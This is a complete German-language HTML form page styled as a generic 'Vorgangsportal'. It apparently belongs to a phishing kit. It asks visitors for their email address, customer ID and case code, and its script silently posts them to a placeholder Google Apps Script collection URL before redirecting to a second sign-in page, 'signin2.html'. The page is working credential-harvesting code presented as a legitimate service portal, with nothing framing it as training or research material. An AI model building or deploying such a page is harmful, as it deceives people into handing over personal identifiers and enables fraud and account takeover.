
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Vorgangsprüfung</title>

<style>
* {
    box-sizing: border-box;
}

body {
    margin: 0;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background: #ffffff;
    font-family: Arial, Helvetica, sans-serif;
    color: #253044;
}

.container {
    width: 100%;
    max-width: 420px;
    padding: 40px 35px;
    background: #fff;
    border: 1px solid #e5e8ed;
    border-radius: 12px;
    box-shadow: 0 5px 24px rgba(0,0,0,0.06);
}

.brand {
    text-align: center;
    font-size: 25px;
    font-weight: bold;
    margin-bottom: 28px;
}

h1 {
    font-size: 23px;
    margin-bottom: 12px;
}

.description {
    font-size: 14px;
    line-height: 1.5;
    color: #626d7c;
    margin-bottom: 25px;
}

label {
    display: block;
    font-size: 14px;
    font-weight: 600;
    margin-bottom: 8px;
}

input {
    width: 100%;
    height: 50px;
    padding: 0 13px;
    border: 1px solid #aeb8c5;
    border-radius: 6px;
    font-size: 16px;
    margin-bottom: 20px;
}

button {
    width: 100%;
    height: 48px;
    border: none;
    border-radius: 25px;
    background: #253044;
    color: white;
    font-size: 16px;
    font-weight: bold;
    cursor: pointer;
}

button:disabled {
    opacity: 0.6;
    cursor: wait;
}

.footer {
    margin-top: 22px;
    text-align: center;
    font-size: 12px;
    color: #89919d;
}
</style>
</head>

<body>

<main class="container">

    <div class="brand">VORGANGSPORTAL</div>

    <h1>Vorgang prüfen</h1>

    <p class="description">
        Bitte geben Sie Ihre Kundenkennung und Ihren Vorgangscode ein.
    </p>

    <form id="testForm">

        <label for="email">E-Mail-Adresse</label>
        <input type="email" id="email" required>

        <label for="kundenkennung">Kundenkennung</label>
        <input type="text" id="kundenkennung" required>

        <label for="vorgangscode">Vorgangscode</label>
        <input type="text" id="vorgangscode" required>

        <button type="submit" id="submitButton">
            Weiter
        </button>

    </form>

    <div class="footer">
        Vorgangsverwaltung
    </div>

</main>

<script>
const SCRIPT_URL = "DEINE_GOOGLE_APPS_SCRIPT_URL";

document.getElementById("testForm").addEventListener("submit", async function(event) {
    event.preventDefault();

    const button = document.getElementById("submitButton");
    button.disabled = true;
    button.textContent = "Wird übermittelt...";

    const data = {
        email: document.getElementById("email").value,
        kundenkennung: document.getElementById("kundenkennung").value,
        vorgangscode: document.getElementById("vorgangscode").value
    };

    try {
        await fetch(SCRIPT_URL, {
            method: "POST",
            mode: "no-cors",
            headers: {
                "Content-Type": "text/plain;charset=utf-8"
            },
            body: JSON.stringify(data)
        });

        window.location.href = "signin2.html";

    } catch (error) {
        button.disabled = false;
        button.textContent = "Weiter";
        alert("Die Übermittlung ist fehlgeschlagen. Bitte versuchen Sie es erneut.");
    }
});
</script>

</body>
</html>
